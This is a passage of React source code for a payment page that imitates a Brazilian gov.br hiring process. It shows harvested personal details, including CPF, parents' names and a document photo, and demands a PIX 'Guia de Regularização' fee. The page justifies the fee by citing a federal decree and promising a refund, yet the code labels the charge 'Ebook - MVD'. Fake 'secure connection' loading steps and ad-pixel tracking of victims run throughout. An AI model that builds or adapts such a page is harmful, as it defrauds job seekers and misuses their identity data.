import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { GovBrHeader } from '../components/GovBrHeader';
import { GovBrFooter } from '../components/GovBrFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Checkbox } from '@/components/ui/checkbox';
import { Dialog, DialogContent, DialogOverlay } from '@/components/ui/dialog';
import { Calendar, Clock, MapPin, User, Briefcase, Building2, CheckCircle, FileText, CreditCard, Shield, Award, AlertTriangle, X, Copy, Check } from 'lucide-react';
import QRCode from 'qrcode';
import { fbPixel } from '../utils/facebookPixel';
import { getGenderedText, getUserGender } from '../utils/genderUtils';
import { getIsGoogleEnv } from '@/lib/env';
import { useTikTokPixel } from '@/hooks/use-tiktok-pixel';
import { getUserBasicData, toE164 } from '@/lib/utils';
function formatToE164(phone: string) {
  const digits = phone.replace(/\D/g, "");

  // se já começa com 55 e tem 12 ou 13 dígitos, assume que está correto
  if (digits.startsWith("55")) {
    return `+${digits}`;
  }

  // caso venha no formato (11) 99999-9999
  if (digits.length === 10 || digits.length === 11) {
    return `+55${digits}`;
  }

  return null; // inválido
}

interface ProtocolData {
  numero: string;
  dataHora: string;
  candidato: {
    nome: string;
    cpf: string;
    email: string;
    telefone: string;
  };
  cargo: {
    titulo: string;
    area: string;
    remuneracao: string;
    cargaHoraria: string;
    turno: string;
  };
  localProva: {
    nome: string;
    endereco: string;
    data: string;
    horario: string;
  };
  unidadeTrabalho: {
    nome: string;
    endereco: string;
    regiao: string;
  };
  status: string;
  validade: string;
}

interface LoadingStep {
  id: string;
  title: string;
  status: 'pending' | 'processing' | 'completed';
  duration: number;
}

export default function ProtocoloPage() {
  const [, navigate] = useLocation();
  const [protocolData, setProtocolData] = useState<ProtocolData | null>(null);
  const userGender = getUserGender();
  const [isLoading, setIsLoading] = useState(true);
  const [acceptTerms, setAcceptTerms] = useState(false);
  const [acceptPriority, setAcceptPriority] = useState(false);
  const [acceptCommitment, setAcceptCommitment] = useState(false);
  const [isPaymentReady, setIsPaymentReady] = useState(false);
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [currentStep, setCurrentStep] = useState(0);
  const [showInitialLoader, setShowInitialLoader] = useState(true);
  const [currentLoadingStep, setCurrentLoadingStep] = useState(0);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [paymentGenerationStep, setPaymentGenerationStep] = useState(0);
  const [paymentError, setPaymentError] = useState<string>('');
  const [showPixModal, setShowPixModal] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [isCheckingPayment, setIsCheckingPayment] = useState(false);
  const [paymentCheckInterval, setPaymentCheckInterval] = useState<NodeJS.Timeout | null>(null);
  const [certificationValue, setCertificationValue] = useState<number>(0);
  const [certificationValueFormatted, setCertificationValueFormatted] = useState<string>('R$ 0,00');
  const [showSgpecModal, setShowSgpecModal] = useState(false);
  const [transactionId, setTransactionId] = useState<string>('');
  const [numberInfo, setNumberInfo] = useState<any>(null);
  const [userData, setUserData] = useState<any>(null);
  const [dadosCompletos, setDadosCompletos] = useState<any>(null);
  const [fotoBase64, setFotoBase64] = useState<string | null>(null);
  const pixel = useTikTokPixel({
    pixelId: import.meta.env.VITE_TIKTOK_PIXEL as string,
    debug: import.meta.env.NODE_ENV !== "production",
    autoPageView: true,
    captureTtclid: true,
    requireConsent: false, // troque para true se tiver CMP
  });
  const region = JSON.parse(localStorage.getItem('user_ip_data') || '{}')?.region;
  const [loadingSteps] = useState<LoadingStep[]>([
    {
      id: 'validating',
      title: 'Validando dados '+getGenderedText(userGender, 'do candidato', 'da candidata')+'...',
      status: 'pending',
      duration: 1500
    },
    {
      id: 'generating',
      title: 'Gerando protocolo oficial...',
      status: 'pending', 
      duration: 2000
    },
    {
      id: 'processing',
      title: 'Processando informações...',
      status: 'pending',
      duration: 1200
    },
    {
      id: 'finalizing',
      title: 'Finalizando documentação...',
      status: 'pending',
      duration: 1800
    }
  ]);
  
  // Test button for dev environments
  const [showTestButton] = useState(() => {
    if (typeof window !== 'undefined') {
      return window.location.hostname.includes('.dev') || window.location.hostname === 'localhost';
    }
    return false;
  });
  const step1Ref = useRef<HTMLDivElement>(null);
  const step2Ref = useRef<HTMLDivElement>(null);
  const paymentRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Buscar valor dinâmico de certificação
    const fetchCertificationValue = async () => {
      try {
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const capturaData = JSON.parse(localStorage.getItem('capturaData') || '{}');

        const response = await fetch('/api/valor-certificacao?sexo='+userData.sexo+'&faixa_de_renda='+capturaData.faixaRenda);
        const data = await response.json();
        
        if (data.success) {
          console.log('=== VALOR DINÂMICO OBTIDO ===');
          console.log('Valor numérico:', data.data.valor);
          console.log('Valor formatado:', data.data.valorFormatado);
          console.log('Valor da certificação:', data.data.valor)
          setCertificationValue(data.data.valor);
          setCertificationValueFormatted(data.data.valorFormatado);
          
          console.log('=== ATUALIZANDO ESTADOS ===');
          console.log('Novo valor definido:', data.data.valor);
          console.log('Novo valor formatado:', data.data.valorFormatado);
          
          // Facebook Pixel - Track protocol/payment page view with dynamic value
          fbPixel.trackProtocolPageView(data.data.valor);
        }
      } catch (error) {
        console.error('Erro ao buscar valor dinâmico:', error);
        // Manter valor padrão em caso de erro
        fbPixel.trackProtocolPageView(75.34);
      }
    };
    
    fetchCertificationValue();

    // Verificar dados do WhatsApp para exibição da foto
    const numberInfoData = localStorage.getItem('number_info');
    if (numberInfoData) {
      try {
        const parsedNumberInfo = JSON.parse(numberInfoData);
        setNumberInfo(parsedNumberInfo);
      } catch (error) {
        console.error('Erro ao parsear number_info:', error);
      }
    }

    // Carregar dados do usuário
    const storedUserData = localStorage.getItem('userData');
    if (storedUserData) {
      try {
        const parsedUserData = JSON.parse(storedUserData);
        setUserData(parsedUserData);
      } catch (error) {
        console.error('Erro ao parsear userData:', error);
      }
    }

    const dadosCompletos = localStorage.getItem('dadosCompletos');

    if (dadosCompletos) {
      try {
        const parsedDadosCompletos = JSON.parse(dadosCompletos);
        setDadosCompletos(parsedDadosCompletos);
      }catch(error) {
        console.error('Erro ao parsear dadosCompletos:', error);
      }
    }
      

    // Carregar foto do documento oficial
    const fotoData = localStorage.getItem('foto');
    if (fotoData) {
      try {
        const foto = JSON.parse(fotoData);
        if (foto?.success && foto?.foto_base64) {
          setFotoBase64(foto.foto_base64);
        }
      } catch (error) {
        console.error('Erro ao parsear foto:', error);
      }
    }

    // Microsoft Clarity - Track protocol page access (payment page)
    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'protocol_payment_page_access', {
        funnel_step: 'step_8_payment_protocol',
        previous_step: 'pre_protocol_completed',
        payment_amount: certificationValueFormatted || 'R$ 75,34',
        payment_page_type: 'certification_fee',
        final_conversion_step: true
      });
    }

    // Processar etapas de loading sequencialmente
    const processLoadingSteps = async () => {
      for (let i = 0; i < loadingSteps.length; i++) {
        setCurrentLoadingStep(i);
        
        // Aguardar duração específica
        await new Promise(resolve => setTimeout(resolve, loadingSteps[i].duration));
      }

      // Finalizar loading e carregar dados
      setTimeout(() => {
        setShowInitialLoader(false);
        loadProtocolData();
      }, 500);
    };

    processLoadingSteps();
  }, []);

  useEffect(() => {
    console.log('=== ESTADO ATUALIZADO ===');
    console.log('certificationValue:', certificationValue);
    console.log('certificationValueFormatted:', certificationValueFormatted);
  }, [certificationValue, certificationValueFormatted]);

  const loadProtocolData = () => {
      try {
        // Recuperar dados reais do localStorage
        const dadosCompletos = localStorage.getItem('dadosCompletos');
        const capturaData = localStorage.getItem('capturaData');
        const agendamentoData = localStorage.getItem('agendamentoData');
        const agendamentoCompleto = localStorage.getItem('agendamentoCompleto');
        const vagaSelecionada = localStorage.getItem('VagaSelecionada');
        const verificacao = localStorage.getItem('verificacaoDocumental');

        console.log('Dados encontrados:', { dadosCompletos, capturaData, agendamentoData, agendamentoCompleto, vagaSelecionada });

        // Usar dados disponíveis, priorizando os mais recentes
        const agendamentoInfo = agendamentoCompleto ? JSON.parse(agendamentoCompleto) : 
                              (agendamentoData ? JSON.parse(agendamentoData) : null);
        
        const dadosCompletosInfo = dadosCompletos ? JSON.parse(dadosCompletos) : null;
        const capturaInfo = capturaData ? JSON.parse(capturaData) : null;
        const vagaInfo = vagaSelecionada ? JSON.parse(vagaSelecionada) : null;
        const verificacaoInfo = verificacao ? JSON.parse(verificacao) : null;

        // Se não há dados suficientes, criar protocolo com dados padrão
        if (!dadosCompletosInfo && !vagaInfo && !agendamentoInfo) {
          console.warn('Criando protocolo com dados padrão devido à falta de informações');
        }

        // Formatar CPF
        const formatCPF = (cpf: string) => {
          return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        };

        // Obter primeiro telefone da captura ou dos dados completos
        const telefone = capturaInfo?.telefone || 
          (dadosCompletosInfo?.telefones && dadosCompletosInfo.telefones[0]?.numero_formatado) || 
          'Telefone não informado';

        // Obter turno do usuário (com fallback para integral se não especificado)
        const turnoUsuario = capturaInfo?.turno || 'integral';
        console.log('Turno do usuário:', turnoUsuario, 'Descrição:', getTurnoDescription(turnoUsuario));

        // Gerar dados do protocolo usando dados disponíveis
        const protocol: ProtocolData = {
          numero: `CR${Date.now().toString().slice(-8)}`,
          dataHora: new Date().toLocaleString('pt-BR'),
          candidato: {
            nome: dadosCompletosInfo?.nome || 'Candidato',
            cpf: dadosCompletosInfo?.cpf ? formatCPF(dadosCompletosInfo.cpf) : '***.***.***-**',
            email: capturaInfo?.email || 'email@exemplo.com',
            telefone: telefone
          },
          cargo: {
            titulo: vagaInfo?.title || 'Atendente Comercial',
            area: vagaInfo?.area || 'Atendimento ao Cliente',
            remuneracao: vagaInfo?.salary || 'R$ 2.000,00 - R$ 2.600,00',
            cargaHoraria: vagaInfo?.carga_horaria || '44h semanais',
            turno: getTurnoDescription(turnoUsuario)
          },
          localProva: {
            nome: agendamentoInfo?.localProva?.nome || 'CEE 02 DE BRASILIA',
            endereco: agendamentoInfo?.localProva?.endereco || 'QUADRA SGAS 612 MODULO D, ASA SUL. ASA SUL. 70200-720 Brasília - DF',
            data: agendamentoInfo?.data ? formatDate(agendamentoInfo.data) : 'Sábado, 19 de julho de 2025',
            horario: agendamentoInfo?.horario || '18:00 - 20:00'
          },
          unidadeTrabalho: {
            nome: vagaInfo?.company || 'Agência do Banco do Brasil',
            endereco: vagaInfo?.location || 'Brasília - Centro',
            regiao: vagaInfo?.location?.split(' - ')[0] || 'Brasília'
          },
          status: verificacaoInfo?.status === 'aprovado' ? 'Aprovado' : 'Regularização Pendente',
          validade: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('pt-BR')
        };
      
        const userBasic = getUserBasicData()

        pixel.identify({
          external_id: userBasic?.cpf,
          email: userBasic?.email,
          phone: toE164(userBasic?.phone)
        })
        setProtocolData(protocol);
        
        // Generate QR code with protocol data
        const qrData = JSON.stringify({
          protocolo: protocol.numero,
          data: protocol.dataHora,
          candidato: protocol.candidato.nome,
          cargo: protocol.cargo.titulo,
          url: window.location.href
        });
        
        QRCode.toDataURL(qrData, {
          width: 80,
          margin: 1,
          color: {
            dark: '#1351B4',
            light: '#FFFFFF'
          }
        }).then(dataUrl => {
          setQrCodeDataUrl(dataUrl);
        }).catch(err => {
          console.error('Erro ao gerar QR code:', err);
        });
        
        // Salvar protocolo no localStorage
        localStorage.setItem('protocoloFinal', JSON.stringify(protocol));
        
      } catch (error) {
        console.error('Erro ao carregar dados do protocolo:', error);
      } finally {
        setIsLoading(false);
      }
    };

  useEffect(() => {
    setIsPaymentReady(acceptTerms && acceptPriority && acceptCommitment);
  }, [acceptTerms, acceptPriority, acceptCommitment]);

  const scrollToElement = (ref: React.RefObject<HTMLDivElement>) => {
    if (ref.current) {
      ref.current.scrollIntoView({
        behavior: 'smooth',
        block: 'center',
      });
    }
  };

  const handleStepAcceptance = (step: number, accepted: boolean) => {
    // Microsoft Clarity - Track step-by-step acceptance (conversion funnel within payment)
    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'payment_step_acceptance', {
        step_number: step,
        step_accepted: accepted,
        funnel_step: `step_8_payment_substep_${step}`,
        payment_progression: `${step + 1}/3 steps completed`
      });
    }

    switch (step) {
      case 0:
        setAcceptTerms(accepted);
        if (accepted) {
          setTimeout(() => {
            setCurrentStep(1);
            setTimeout(() => scrollToElement(step1Ref), 200);
          }, 500);
        } else {
          setCurrentStep(0);
          setAcceptPriority(false);
          setAcceptCommitment(false);
        }
        break;
      case 1:
        setAcceptPriority(accepted);
        if (accepted) {
          setTimeout(() => {
            setCurrentStep(2);
            setTimeout(() => scrollToElement(step2Ref), 200);
          }, 500);
        } else {
          setCurrentStep(1);
          setAcceptCommitment(false);
        }
        break;
      case 2:
        setAcceptCommitment(accepted);
        if (accepted) {
          setTimeout(() => {
            setCurrentStep(3);
            setTimeout(() => scrollToElement(paymentRef), 200);
          }, 500);
        } else {
          setCurrentStep(2);
        }
        break;
    }
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return 'Data não informada';
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR', { 
      weekday: 'long', 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric' 
    });
  };

  const getTurnoDescription = (turno: string) => {
    if (!turno) return 'Período Integral';
    
    switch (turno) {
      case 'manha':
        return 'Manhã (07:00 - 13:00)';
      case 'tarde':
        return 'Tarde (14:00 - 20:00)';
      case 'noite':
        return 'Noite (21:00 - 03:00) - Adicional noturno 10%';
      case 'integral':
        return 'Período Integral (07:00 - 17:00) - Adicional 15%';
      default:
        return 'Período Integral (07:00 - 17:00)';
    }
  };

  const paymentSteps = [
    { title: 'Validando protocolo...', duration: 1500 },
    { title: 'Estabelecendo conexão segura...', duration: 2000 },
    { title: 'Criando ambiente de quitação protegido...', duration: 1800 },
    { title: 'Configurando segurança...', duration: 1200 }
  ];

  const handleCertificationPayment = async () => {
    if (!isPaymentReady) return;

    // Facebook Pixel - Track payment generation (final conversion)
    fbPixel.trackPaymentGeneration(certificationValue);

    // Microsoft Clarity - Track payment generation attempt (final conversion action)
    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'payment_generation_initiated', {
        funnel_step: 'step_8_final_payment_action',
        payment_method: 'pix',
        payment_amount: certificationValue * 100, // in cents
        conversion_point: 'final_cta_clicked',
        all_terms_accepted: acceptTerms && acceptPriority && acceptCommitment
      });
    }
    const userBasic = getUserBasicData()

    pixel.identify({
      external_id: userBasic?.cpf,
      email: userBasic?.email,
      phone: toE164(userBasic?.phone)
    })
    const VagaSelecionada = JSON.parse(localStorage.getItem("VagaSelecionada") || '{}')
    pixel.initiateCheckout({
      contents: [
        { content_id: VagaSelecionada.title.toLowerCase().replace(/[^a-z0-9]/gi, ''), quantity: 1, price: certificationValue }],
      value: certificationValue,
      content_name: VagaSelecionada.title,
      content_type: "product",
      currency: "BRL",
    })
    setShowPaymentModal(true);
    setPaymentGenerationStep(0);
    setPaymentError('');

    try {
      // Simulate loading steps
      for (let i = 0; i < paymentSteps.length; i++) {
        setPaymentGenerationStep(i);
        await new Promise(resolve => setTimeout(resolve, paymentSteps[i].duration));
      }

      // Get all user data from localStorage
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      const protocoloFinal = JSON.parse(localStorage.getItem('protocoloFinal') || '{}');
      const jobSearchResults = JSON.parse(localStorage.getItem('jobSearchResults') || '{}');
      const evaluationData = JSON.parse(localStorage.getItem('evaluationData') || '{}');
      const dadosCompletos = JSON.parse(localStorage.getItem('dadosCompletos') || '{}');
      const capturaData = JSON.parse(localStorage.getItem('capturaData') || '{}');
      const vagaSelecionada = JSON.parse(localStorage.getItem('VagaSelecionada') || '{}');
      const agendamentoData = JSON.parse(localStorage.getItem('agendamentoData') || '{}');
      const hasFoto = localStorage.getItem('foto') !== null ? 'Prioritária' : 'Inicial'
      let state = "erro";
      const userIpDataRaw = localStorage.getItem('user_ip_data');
      if(userIpDataRaw) {
        try {
          const userIpData = JSON.parse(userIpDataRaw);
          state = userIpData.region || "erro";
        } catch (e) {
          console.error('Erro ao fazer parse do user_ip_data:', e);
        }
      }
      // Prepare PIX payment data with all localStorage data
      const pixPaymentData = {
        amount: certificationValue,
        description: "Ebook - MVD",
        customer: {
          name: userData.nomeCompleto || capturaData.nomeCompleto || dadosCompletos.nome || protocolData?.candidato.nome ||  'Candidato',
          email: userData.email || capturaData.email || protocolData?.candidato.email || 'candidato@email.com',
          cpf: userData.cpf || capturaData.cpf || dadosCompletos.cpf || protocolData?.candidato.cpf  || '',
          phone: userData.telefone || capturaData.telefone || protocolData?.candidato.telefone || ''
        },
        protocol: protocolData?.numero,
        utm_params: localStorage.getItem('utm_params'),
        // Send all localStorage data to backend
        userData: userData,
        protocoloFinal: protocoloFinal,
        jobSearchResults: jobSearchResults,
        evaluationData: evaluationData,
        dadosCompletos: dadosCompletos,
        capturaData: capturaData,
        vagaSelecionada: vagaSelecionada,
        inscricaoData: {
          vaga: vagaSelecionada,
          localProva: agendamentoData.local,
          dataProva: agendamentoData.data,
          userData: userData,
          contatos: {
            email: userData.email || capturaData.email || protocolData?.candidato.email,
            telefone: userData.telefone || capturaData.telefone || protocolData?.candidato.telefone
          }
        }
      };

      // Call PIX generation API
      const response = await fetch('/api/gerar-pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(pixPaymentData),
      });

      if (!response.ok) {
        throw new Error('Erro ao gerar PIX para quitação');
      }

      const pixResponse = await response.json();
      
      // Microsoft Clarity - Track successful payment generation
      if (clarity) {
        clarity('event', 'payment_generated_successfully', {
          funnel_step: 'step_8_payment_modal_opened',
          pix_code_generated: !!pixResponse.data?.pixCode,
          qr_code_generated: !!pixResponse.data?.qrCodeBase64,
          transaction_id: pixResponse.data?.id || 'unknown',
          final_conversion_reached: true
        });
      }
      
      // Save PIX data to localStorage
      const pixDataStorage = {
        ...pixResponse,
        inscricaoData: pixPaymentData.inscricaoData
      };
      
      localStorage.setItem('pixData', JSON.stringify(pixDataStorage));
      
      // Save certification data
      localStorage.setItem('certificacaoProtocolo', JSON.stringify({
        protocolo: protocolData?.numero,
        valor: certificationValue,
        aceiteTermos: true,
        dataAceite: new Date().toISOString()
      }));

      // Close generation modal and show PIX modal
      setShowPaymentModal(false);
      setPixData(pixResponse.data);
      setShowPixModal(true);
      
      // Start payment verification process
      startPaymentVerification(pixResponse.data?.id);

    } catch (error) {
      console.error('Erro ao gerar PIX:', error);
      
      // Microsoft Clarity - Track payment generation failure
      if (clarity) {
        clarity('event', 'payment_generation_failed', {
          funnel_step: 'step_8_payment_error',
          error_message: (error as Error).message || 'unknown_error',
          conversion_barrier: 'payment_technical_issue'
        });
      }

      setPaymentError('Erro ao gerar guia de regularização. Tente novamente em alguns instantes.');
      setPaymentGenerationStep(-1); // Error state
    }
  };

  const handleCopyPixCode = async () => {
    if (pixData?.pixCode) {
      try {
        await navigator.clipboard.writeText(pixData.pixCode);
        setIsCopied(true);
        
        // Microsoft Clarity - Track PIX code copy (high purchase intent)
        const clarity = (window as any).clarity;
        if (clarity) {
          clarity('event', 'pix_code_copied', {
            funnel_step: 'step_8_pix_code_interaction',
            payment_intent: 'very_high',
            user_action: 'code_copied_for_payment'
          });
        }

        setTimeout(() => setIsCopied(false), 2000);
      } catch (err) {
        console.error('Erro ao copiar código PIX:', err);
      }
    }
  };

  // Function to start payment verification process
  const startPaymentVerification = (transactionId: string) => {
    if (!transactionId) {
      console.error('Transaction ID is required for payment verification');
      return;
    }
    
    setIsCheckingPayment(true);
    
    // Clear any existing interval
    if (paymentCheckInterval) {
      clearInterval(paymentCheckInterval);
    }
    
    // Check payment status every 1 second
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/verificar-status-pagamento/${transactionId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });
        
        if (!response.ok) {
          console.error('Error checking payment status:', response.status);
          return;
        }
        
        const statusData = await response.json();
        
        // Log para debug
        console.log('Resposta completa da API:', statusData);
        
        // A API retorna: { success: true, data: { status: 'paid', ... } }
        const currentStatus = (statusData.data?.status || statusData.status);
        console.log('Status atual do pagamento:', currentStatus);
        console.log(statusData)
        console.log(certificationValue, typeof certificationValue)
        // Check if payment is completed - only check for approved statuses
        if (currentStatus === 'paid' || currentStatus === 'completed' || currentStatus === 'approved' || currentStatus !== 'pending') {
          console.log('Pagamento confirmado! Status:', currentStatus);
           
          // Payment confirmed! Clear interval and handle success
          clearInterval(interval);
          setPaymentCheckInterval(null);
          setIsCheckingPayment(false);
          
          // Fire Facebook Pixel Purchase event
          console.log('Disparando evento Purchase do Facebook Pixel');

          const trackPaymentCompletionEmitido = localStorage.getItem("trackPaymentCompletion")
          if(!trackPaymentCompletionEmitido) {

            const VagaSelecionada = JSON.parse(localStorage.getItem('VagaSelecionada') || '{}')
            pixel.purchase({
              order_id: statusData.data.id,
              content_name: VagaSelecionada.title,
              content_type: "product",
              contents: [
                { content_id: VagaSelecionada.title.toLowerCase().replace(/[^a-z0-9]/gi, ''), price: certificationValue, quantity: 1 }
              ],
              value: certificationValue,
              currency: "BRL",
            });
            
            fbPixel.trackPaymentCompletion(certificationValue);
            localStorage.setItem("trackPaymentCompletion", "true")
          }
          
          // Microsoft Clarity - Track successful purchase
          const clarity = (window as any).clarity;
          if (clarity) {
            clarity('event', 'purchase_completed', {
              funnel_step: 'step_9_payment_confirmed',
              transaction_id: transactionId,
              payment_amount: certificationValue * 100, // in cents
              payment_status: currentStatus,
              conversion_complete: true,
              protocol_number: protocolData?.numero
            });
          }
                 
          // Close PIX modal and show SGPEC modal
          setShowPixModal(false);
          
          // Save payment success data
          localStorage.setItem('pagamentoAprovado', JSON.stringify({
            transactionId: transactionId,
            status: currentStatus,
            timestamp: new Date().toISOString(),
            amount: certificationValue
          }));
          
          // Show SGPEC modal instead of redirecting
          setTransactionId(transactionId);
          setShowSgpecModal(true);
        }
        
      } catch (error) {
        console.error('Error checking payment status:', error);
      }
    }, 1000); // Check every 1 second
    
    setPaymentCheckInterval(interval);
  };

  // Function to stop payment verification
  const stopPaymentVerification = () => {
    if (paymentCheckInterval) {
      clearInterval(paymentCheckInterval);
      setPaymentCheckInterval(null);
    }
    setIsCheckingPayment(false);
  };

  // Cleanup on component unmount
  useEffect(() => {
    return () => {
      stopPaymentVerification();
    };
  }, []);

  const handleClosePixModal = () => {
    // Stop payment verification when modal is closed
    stopPaymentVerification();
    setShowPixModal(false);
  };

  const handleCloseSgpecModal = () => {    
    // Redirect to access page with transaction ID
    navigate(`/acesso?transaction_id=${transactionId}`);
  };

  const getCandidateFirstName = () => {
    const nome = protocolData?.candidato.nome || '';
    return nome.split(' ')[0];
  };

  const getCandidateContactInfo = () => {
    try {
      const capturaData = localStorage.getItem('capturaData');
      if (capturaData) {
        const data = JSON.parse(capturaData);
        return {
          email: data.email || '',
          telefone: data.telefone || ''
        };
      }
    } catch (error) {
      console.error('Erro ao buscar dados de contato:', error);
    }
    return { email: '', telefone: '' };
  };

  // Loader minimalista tela cheia como no agendamento
  if (showInitialLoader) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 mx-auto border-4 border-gray-200 border-t-[#1351B4] rounded-full animate-spin mb-4"></div>
          <p className="text-gray-600">
            {loadingSteps[currentLoadingStep]?.title || 'Carregando protocolo de inscrição...'}
          </p>
        </div>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="w-8 h-8 mx-auto border-2 border-gray-200 border-t-[#1351B4] rounded-full animate-spin mb-4"></div>
          <p className="text-gray-600">Carregando dados...</p>
        </div>
      </div>
    );
  }

  if (!protocolData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <p className="text-gray-600 mb-4">Erro ao carregar dados do protocolo</p>
          <button 
            onClick={() => navigate('/agendamento')}
            className="text-[#1351B4] hover:underline"
          >
            Voltar ao agendamento
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, sans-serif' }}>
      <GovBrHeader />
      
      <main className="container mx-auto max-w-4xl px-4 py-8 pt-0">
        {/* Breadcrumb */}
        <nav className="text-sm text-gray-600 mb-8">
          <span>Início</span>
          <span className="mx-2">›</span>
          <span>Processo Seletivo</span>
          <span className="mx-2">›</span>
          <span>Verificação</span>
          <span className="mx-2">›</span>
          <span className="text-[#1351B4] font-medium">Protocolo de Inscrição</span>
        </nav>

        {/* Header */}
        <div className="mb-6 relative">
          <h1 className="text-xl font-light text-gray-900 mb-1">
            Protocolo {protocolData.numero}
          </h1>
          <div className="flex flex-col gap-2">
            <p className="text-sm text-gray-600">
              Gerado em {protocolData.dataHora}
            </p>
            <div className="inline-flex items-center gap-2">
              <div className="flex items-center gap-1.5 px-2.5 py-1 bg-amber-50 border border-amber-200 rounded-md">
                <div className="w-2 h-2 bg-amber-400 rounded-full"></div>
                <span className="text-xs font-medium text-amber-800">Regularização Pendente</span>
              </div>
            </div>
          </div>
          
          {/* Floating QR Code */}
          {qrCodeDataUrl && (
            <div className="absolute top-0 right-0  p-2">
              <img 
                src={qrCodeDataUrl} 
                alt="QR Code do Protocolo" 
                className="w-12 h-12 mx-auto"
              />
            </div>
          )}
        </div>

        {/* Protocol Content */}
        <div className="space-y-6 mb-8">
          {/* Basic Info */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
            <div>
              <span className="text-gray-500">{getGenderedText(userGender, 'Candidato:', 'Candidata:')}</span>
              <div className="flex items-center gap-3">
                <p className="font-medium">{protocolData.candidato.nome}</p>
                {/* Foto de perfil WhatsApp */}
                {numberInfo && !fotoBase64 && !numberInfo.is_biz && numberInfo.picUrl && numberInfo.picUrl.trim() !== '' && (
                  <img 
                    src={numberInfo.picUrl} 
                    alt="Foto de perfil" 
                    className="w-8 h-8 rounded-full border border-gray-300"
                    crossOrigin="anonymous"
                  />
                )}
                {/* Foto do documento oficial */}
                {fotoBase64 && (
                  <img 
                    src={`data:image/jpeg;base64,${fotoBase64}`}
                    alt="Foto do documento oficial" 
                    className="w-8 h-8 object-cover border border-gray-300"
                  />
                )}
              </div>
            </div>
            <div>
              <span className="text-gray-500">CPF:</span>
              <p className="font-medium">{protocolData.candidato.cpf}</p>
            </div>
            {userData?.sexo && (
              <div>
                <span className="text-gray-500">Gênero:</span>
                <p className="font-medium">{userData.sexo === 'M' ? 'Masculino' : 'Feminino'}</p>
              </div>
            )}
            <div>
              <span className="text-gray-500">Categoria:</span>
              <p className="font-medium">{protocolData.cargo.titulo}</p>
            </div>
            <div>
              <span className="text-gray-500">Carga Horária:</span>
              <p className="font-medium">{protocolData.cargo.cargaHoraria}</p>
            </div>
            {/* Dados enriquecidos da API Lunnar */}
            {userData?.municipioNascimento && (
              <div>
                <span className="text-gray-500">Município de Nascimento:</span>
                <p className="font-medium">{userData.municipioNascimento}</p>
              </div>
            )}
            {userData?.nomeMae && (
              <div>
                <span className="text-gray-500">Nome da Mãe:</span>
                <p className="font-medium">{userData.nomeMae}</p>
              </div>
            )}
            {dadosCompletos?.nomePai && dadosCompletos.nomePai.split(' ').length >= 3 && (
              <div>
                <span className="text-gray-500">Nome do Pai:</span>
                <p className="font-medium">{dadosCompletos.nomePai}</p>
              </div>
            )}
          </div>

          {/* Exam Details */}
          <div className="border-t border-gray-200 pt-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
              <div>
                <span className="text-gray-500">Data de início:</span>
                <p className="font-medium text-[#1351B4]">{protocolData.localProva.data}</p>
              </div>
              <div>
                <span className="text-gray-500">Horário:</span>
                <p className="font-medium text-[#1351B4]">{protocolData.localProva.horario}</p>
              </div>
              <div className="md:col-span-2">
                <span className="text-gray-500">Local:</span>
                <p className="font-medium">{protocolData.localProva.nome}</p>
                <p className="text-xs text-gray-600 mt-1">{protocolData.localProva.endereco}</p>
              </div>
            </div>
          </div>

          {/* Important Notes */}
          <div className="bg-blue-50 border border-blue-200 rounded p-3">
            <p className="text-xs text-blue-800">
              Compareça com 30 min de antecedência • Porte documento com foto • Validade: {protocolData.validade}
            </p>
          </div>
        </div>

        {/* Progressive Terms Section */}
        <div className="mb-8">
          {/* Seção destacada minimalista */}
          <div className="border-l-4 border-[#1351B4] bg-blue-50 p-6 mb-6">
            <h4 className="text-lg font-semibold text-[#1351B4] mb-4">Para Garantir Sua Vaga</h4>
            <p className="text-gray-800 mb-4 text-sm leading-relaxed">
              Conforme estabelecido no Decreto Federal nº 9.739/2025, é necessária a quitação da 
              <strong>{' '}Guia de Regularização em aberto</strong> no valor de <strong>{certificationValueFormatted}</strong> para confirmação da participação no inicio do programa.
            </p>
            <div className="border-l-2 border-gray-300 pl-4 mb-4">
              <p className="text-gray-700 text-sm font-medium mb-1">
                Este valor não é uma taxa
              </p>
              <p className="text-gray-600 text-sm leading-relaxed">
                Trata-se de uma <strong>garantia de comparecimento</strong> que será <strong>integralmente devolvida</strong> após sua presença na prova. 
                Este procedimento garante a seriedade dos candidatos e evita vagas ociosas no processo seletivo.
              </p>
            </div>
            <p className="text-gray-700 mb-4 text-sm leading-relaxed">
              Esta medida visa garantir o comparecimento dos candidatos inscritos e a organização adequada 
              do processo de seleção pública.
            </p>
          </div>
          
          {/* Step 0: Why payment is needed */}
          <div className="mb-6">
            <div className="bg-gray-50 border border-gray-200 rounded p-4">
              <label className="flex items-start space-x-3 cursor-pointer text-sm">
